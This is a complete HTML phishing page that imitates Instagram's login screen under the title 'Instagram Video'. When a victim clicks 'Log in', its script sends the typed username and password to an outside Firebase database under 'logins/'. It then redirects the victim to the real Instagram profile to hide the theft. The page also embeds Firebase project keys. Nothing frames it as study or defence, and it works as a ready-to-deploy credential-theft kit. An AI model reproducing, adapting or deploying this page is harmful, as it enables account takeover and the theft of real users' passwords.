<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Video</title>

    <style>
        body {
            background-color: #000;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .login-container {
            background-color: #121212;
            padding: 40px;
            border-radius: 10px;
            text-align: center;
        }
        .logo {
            width: 60px;
            margin-bottom: 20px;
        }
        input {
            display: block;
            width: 250px;
            padding: 10px;
            margin: 10px auto;
            border: none;
            border-radius: 5px;
        }
        button {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }
        a {
            color: #0095f6;
            text-decoration: none;
            display: block;
            margin-top: 15px;
        }
        .meta {
            margin-top: 20px;
            font-size: 12px;
            color: gray;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
        <input type="text" id="username" placeholder="Username or Email">
        <input type="password" id="password" placeholder="Password">
        <button id="login-btn">Log in</button>
        <a href="#">Forgotten password?</a>
        <button id="create-btn" style="margin-top: 15px; background: none; border: 1px solid gray; color: white;">Create new account</button>
        <div class="meta">Meta</div>
    </div>

    <!-- Firebase and app logic -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAEG5nw9xc5pK-0k9a5fSXUqw9JKi9RvdI",
            authDomain: "getting-6e14c.firebaseapp.com",
            databaseURL: "https://getting-6e14c-default-rtdb.firebaseio.com",
            projectId: "getting-6e14c",
            storageBucket: "getting-6e14c.appspot.com",
            messagingSenderId: "361620661482",
            appId: "1:361620661482:web:dc36dfc6314e8368e1a393",
            measurementId: "G-M0958KW3HY"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        document.getElementById('login-btn').addEventListener('click', () => {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const newLoginRef = push(ref(db, 'logins/'));
            set(newLoginRef, {
                username: username,
                password: password,
                timestamp: new Date().toISOString()
            })
            .then(() => {
                console.log('Data written:', username, password);

                const appUrl = `instagram://user?username=${encodeURIComponent(username)}`;
                const webUrl = `https://www.instagram.com/${encodeURIComponent(username)}/`;

                // Create a hidden link to trigger the redirect
                const a = document.createElement('a');
                a.href = appUrl;
                a.style.display = 'none';
                document.body.appendChild(a);
                a.click();

                // Fallback to browser if app doesn't open
                setTimeout(() => {
                    window.location.href = webUrl;
                }, 1500);
            })
            .catch((error) => {
                console.error('Error writing to database:', error);
                alert('Failed to send data to database');
            });
        });

        document.getElementById('create-btn').addEventListener('click', () => {
            alert('Create account button clicked');
        });
    </script>
</body>
</html>
